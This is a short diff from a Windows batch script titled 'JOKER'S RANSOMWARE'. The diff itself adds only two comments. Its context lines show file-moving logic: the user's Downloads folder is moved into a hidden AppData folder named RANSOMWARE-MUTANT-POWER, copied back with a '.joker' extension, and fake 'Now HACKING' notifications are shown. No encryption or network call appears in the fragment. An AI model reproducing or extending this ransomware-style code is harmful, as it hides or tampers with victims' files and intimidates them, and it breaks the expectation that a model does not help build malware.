@@ -66,7 +66,7 @@ echo .
 pause
 cls
 
-
+:: ^From line 70, background run...
 set "btitle=HACKER"
 :: Notification content
 set "text=Now HACKING"
@@ -312,6 +312,7 @@ copy %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\doc\*.* %userprofile%\Documen
 move %userprofile%\downloads\*.* %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\down\
 copy %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\down\*.* %userprofile%\downloads\*.joker*
 cls
+:: Up to line 314, background run...
 title JOKER'S RANSOMWARE                    
 ::set t.itle
 ECHO  ■■■■■                  ■■■                  ■    ■■                ■■■■■                ■■■■
